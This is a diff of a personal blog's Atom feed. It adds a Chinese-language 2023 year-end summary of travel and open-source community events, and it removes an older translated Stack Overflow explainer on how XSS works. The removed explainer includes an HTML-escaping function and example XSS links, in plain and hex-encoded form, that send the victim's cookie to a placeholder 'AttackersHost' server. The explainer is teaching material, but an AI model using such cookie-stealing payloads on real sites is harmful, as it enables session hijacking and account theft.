@@ -6,7 +6,7 @@
   <link href="https://stevending1st.github.io/blog/atom.xml" rel="self"/>
   
   <link href="https://stevending1st.github.io/blog/"/>
-  <updated>2023-01-27T04:42:49.942Z</updated>
+  <updated>2024-02-17T15:47:04.321Z</updated>
   <id>https://stevending1st.github.io/blog/</id>
   
   <author>
@@ -15,6 +15,27 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>2023 年终总结</title>
+    <link href="https://stevending1st.github.io/blog/20240217-year-end-summary-2023/"/>
+    <id>https://stevending1st.github.io/blog/20240217-year-end-summary-2023/</id>
+    <published>2024-02-17T15:39:09.000Z</published>
+    <updated>2024-02-17T15:47:04.321Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="流水账"><a href="#流水账" class="headerlink" title="流水账"></a>流水账</h2><p>春节前和同事一起赶工一个官网项目，春节后开始整理自己的开源项目。</p><span id="more"></span><p>3 月 5 日去了一趟厂窖，参观了厂窖惨案遇难者同胞纪念馆，比想象的人要多，这里与家族命运有着莫大的关系，一直想去，终于下定决心去了一趟。3 月还受邀去了一趟广州参加 freeCodeCamp 的中国区 Top Contributors Party，提前几天出发，在长沙逗留了几天，一来见朋友，二来顺便在长沙逛逛，这次弥补了身为湖南人数次经过长沙却没有爬过岳麓山和逛过橘子洲的遗憾，还去了新民学会旧址，蔡家的菜园、岳麓山上的坟头、时务学堂的故址和橘子洲上冷清且不开的庙宇使我难忘，这次还买到和印象中十多年前味道一样的胡椒饼。在广州见到了久仰的 Quincy Larson，作为编程教育的非盈利机构的创建者，他改变了许多人的命运，我们尊称他为“校长”。我到得比较早，校长到后请我们喝奶茶，还在路上展示了一下他强壮的身体。虽然吃晚饭的时候算是活动正式开始，但我们一直没有停止交流，晚饭时我还展示了一下收集的 freeCodeCamp 中文社区的照片，险些弄砸，大家一直聊到很晚，有意思的是有一桌人竟或多或少和开源社有点“八竿子打得着”的关系，当然也吸纳一些人参与开源社的贡献，次日大家也起来特别早，继续交流。我当面问了校长很多自认为“尖锐”且迫切的问题，他的回答要比我乐观很多，还和 Miya 当面厘清了很多社区过去的纷争，大家坦诚交流。像这样的活动，对于我一个不常外出参加活动的人就是大型网友见面会。活动次日中午和苏熊、水歌、Manta 吃了点东西，去逛了下黄埔军校，晚上在上下九住下，次日下午又去了沙面岛，我只身前往顺德，拜访一位世交的叔叔，晚上他带我吃湘菜，第二天又带我饮早茶，还驱车带我到药州遗迹与方二兄见面。我与方二兄，年龄相仿，在网络上交流颇多，见面时我竟不知从何聊起，他带我逛书院，印象最深的是庐江书院（现在是岭南金融博物馆）之完整和考亭书院之破败，两相对比，不禁慨叹，后面又逛了六榕和光孝两寺，叔叔婶婶请我吃饭后我便回家了。</p><p>回家后，开始接手一个外包项目，零零散散，合作形式也从项目外包到人力外包，直到 9 月提出工作变动事宜，才逐步退出项目。</p><p>7 月原本计划去台湾参加 COSCUP，因为台湾侧出入证的问题无法顺利解决，只好转为线上参会，相当遗憾。</p><p>8 月去常德做了一个脚部的小手术，没想到因为这个没办法好好穿鞋穿袜，得了脚气，直到 10 月才彻底好。</p><p>9 月上旬开源社发起的 KCC 长沙社区第一次活动，我特地过去，见到了庄老师和久仰的适兕老师，也结识了麒麟软件的诸多老师。下旬我前往东北参加老师的婚礼，路过北京，正好召开开源产业大会，李小明分享给我一张门票，去逛了一下，又是一次网友见面会，大家相约 10 月在成都见面。在学校给学弟学妹们推荐开源资料、推广开源理念，不知道能否为他们打开一扇新窗口，婚礼上见到了一些旧友，聊了聊毕业后的这些经历，还有那些能联系上或联系不上的人，真是让人感慨。因为工作原因，吃完晚饭便回家了。</p><p>10 月因为开源年会迫在眉睫，给我分配的任务是协调合作伙伴的落地事宜，因为没有经验，弄成了几乎“全职”（当然是免费工作）在做这件事，但结果却让人难以满意。25 日上午到达成都，下午便去做一些“落地”的事情，一直忙到了 31 日晚上才算彻底解决，中间偶尔忙里偷闲喝个茶，吃个饭，参个会，一路忙过来有欢笑有泪水，有争执有感动，当然最重要的还是网友见面。最让我感动的是在“开源之夜”上，一位老师为他的学生定制了一个蛋糕，给他们过生日。</p><p>11 月的第一天，公司的成员团聚吃了一顿柴火鸡，次日和 Too 兄在春熙路附近闲逛聊天，意外路过古大圣慈寺。剩下的几天日程就是见新旧朋友、参会、吃饭和闲逛，赶在上旬结束前赶回了家。之前参加的 OpenSODA 比赛在下旬于无锡召开线下路演决赛，正式比赛前不久才知道此事，为了筹备此次比赛又花了不少时间，在比赛期间见到了久仰的 Frank，比赛结束后受邀参观了无锡软件园，收获颇丰，但由于有个项目延期严重，在统一安排的行程结束后，赶回家了。</p><p>11 月下旬开始，直至年末一直在赶项目进度。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>一年下来去了广州、长沙、东北、成都、无锡等地，是我历年来在外逛得最多的一年。</p><p>可惜书还是读的没有买的多。</p><p>这一年看过的纪录片比较喜欢《斯民小学》，电影比较喜欢《东北告别天团》，电视剧比较喜欢《平凡之路》《心想事成》《显微镜下的大明之丝绢案》《狂飙》，动漫比较喜欢《中国奇谭》。播客比较推荐《剧谈社 | 翻译艺术品》、《开源面对面》。</p><p>在 COSCUP 和 COSCon 分别做了一个分享。</p>]]></content>
+    
+    
+    <summary type="html">&lt;h2 id=&quot;流水账&quot;&gt;&lt;a href=&quot;#流水账&quot; class=&quot;headerlink&quot; title=&quot;流水账&quot;&gt;&lt;/a&gt;流水账&lt;/h2&gt;&lt;p&gt;春节前和同事一起赶工一个官网项目，春节后开始整理自己的开源项目。&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="年终总结" scheme="https://stevending1st.github.io/blog/categories/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
+    
+    
+    <category term="年终总结" scheme="https://stevending1st.github.io/blog/tags/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
+    
+  </entry>
   
   <entry>
     <title>2022 年终总结</title>
@@ -482,33 +503,6 @@
     
     
     <category term="年终总结" scheme="https://stevending1st.github.io/blog/tags/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>XSS 工作原理</title>
-    <link href="https://stevending1st.github.io/blog/20171217-how-does-xss-work/"/>
-    <id>https://stevending1st.github.io/blog/20171217-how-does-xss-work/</id>
-    <published>2017-12-17T11:09:00.000Z</published>
-    <updated>2022-10-21T08:05:45.854Z</updated>
-    
-    <content type="html"><![CDATA[<blockquote><p><strong>文章原址：</strong> <a href="https://stackoverflow.com/questions/239194/how-does-xss-work">https://stackoverflow.com/questions/239194/how-does-xss-work</a></p></blockquote><span id="more"></span><h1 id="问题描述："><a href="#问题描述：" class="headerlink" title="问题描述："></a>问题描述：</h1><p>能不能用简单的语言介绍一下 XSS 的工作原理，最好举一个例子，谷歌不能很好的检索这个问题。<br>(Ask by  <strong>Vicky</strong>)</p><h1 id="高赞回答"><a href="#高赞回答" class="headerlink" title="高赞回答"></a>高赞回答</h1><p>当 XSS 存在时，外部应用程序的字符串被解释为代码。<br>如果你的 HTML 是这样的：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">BODY</span>&gt;</span></span><br><span class="line">  &lt;?= $myQueryParameter ?&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">BODY</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果变量 <code>$myQueryParameter</code> 包含一个 <code>&lt;SCRIPT&gt;</code> 标签，它将最终执行（<code>&lt;SCRIPT&gt;</code> 中的）代码。<br>为了防止输入作为代码执行，必须恰当的<strong>转义</strong>某些内容。<br>上面的问题可以通过让变量 <code>$myQueryParameter</code> 包含纯文本解决，但不能把纯文本直接放到HTML中并期望它执行。<br>所以让纯文本变成 HTML，这样才能让它在 HTML 页面中显示。将一种语言的字符串转换成另一种语言就可以嵌入了。<br>你可以执行一个函数来把纯文本转义成 HTML，如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">escapePlainTextToHTML</span>(<span class="params">plainText</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> plainText.<span class="title function_">replace</span>(<span class="regexp">/\0/g</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">      .<span class="title function_">replace</span>(<span class="regexp">/&amp;/g</span>, <span class="string">&#x27;&amp;amp;&#x27;</span>)</span><br><span class="line">      .<span class="title function_">replace</span>(<span class="regexp">/&lt;/g</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>)</span><br><span class="line">      .<span class="title function_">replace</span>(<span class="regexp">/&gt;/g</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>)</span><br><span class="line">      .<span class="title function_">replace</span>(<span class="regexp">/&quot;/g</span>, <span class="string">&#x27;&amp;#34;&#x27;</span>)</span><br><span class="line">      .<span class="title function_">replace</span>(<span class="regexp">/&#x27;/g</span>, <span class="string">&#x27;&amp;#39;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（answered by <B><a href="https://stackoverflow.com/users/20394/mike-samuel">Mike Samuel</a></B>）</p><hr><p>跨站脚本（XSS）主要是动态网站页面的安全漏洞，攻击者创建一个恶意链接向网站植入可执行的恶意 JavaScript 代码。大多数情况下，这种漏洞在 GET 变量无需过滤或检测内容就能输出或响应时复现。<br>当受害人点击链接，恶意代码能发送受害人的 cookie 到另一台服务器，或者修改受影响的站点，注入表单，窃取用户名和密码，和其他钓鱼诈骗方法。<br>恶意链接例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://VulnerableHost/a.php?variable=&lt;script&gt;document.location=&#x27;http://AttackersHost/cgi-bin/cookie.cgi%3Fdata=&#x27;+document.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>也能编译恶意代码，十六进制如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://VulnerableHost/a.php?variable=%22%3E%3C%73%63%72%69%70%74%3E%64%6F%63%75%6D%65%6E%74%2E%6C%6F%63%61%74%69%6F%6E%3D%27%68%74%74%70%3A%2F%2F%41%74%74%61%63%6B%65%72%73%48%6F%73%74%2F%63%67%69%2D%62%69%6E%2F%63%6F%6F%6B%69%65%2E%63%67%69%3F%20%27%2B%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%3C%2F%73%63%72%69%70%74%3E</span><br></pre></td></tr></table></figure><p>（answered by <B><a href="https://stackoverflow.com/users/5445/cms">CMS</a></B>）</p>]]></content>
-    
-    
-    <summary type="html">&lt;blockquote&gt;
-&lt;p&gt;&lt;strong&gt;文章原址：&lt;/strong&gt; &lt;a href=&quot;https://stackoverflow.com/questions/239194/how-does-xss-work&quot;&gt;https://stackoverflow.com/questions/239194/how-does-xss-work&lt;/a&gt;&lt;/p&gt;
-&lt;/blockquote&gt;</summary>
-    
-    
-    
-    <category term="stackoverflow 高赞翻译" scheme="https://stevending1st.github.io/blog/categories/stackoverflow-%E9%AB%98%E8%B5%9E%E7%BF%BB%E8%AF%91/"/>
-    
-    
-    <category term="stackoverflow" scheme="https://stevending1st.github.io/blog/tags/stackoverflow/"/>
-    
-    <category term="XSS" scheme="https://stevending1st.github.io/blog/tags/xss/"/>
-    
-    <category term="网络安全" scheme="https://stevending1st.github.io/blog/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
     
   </entry>
   
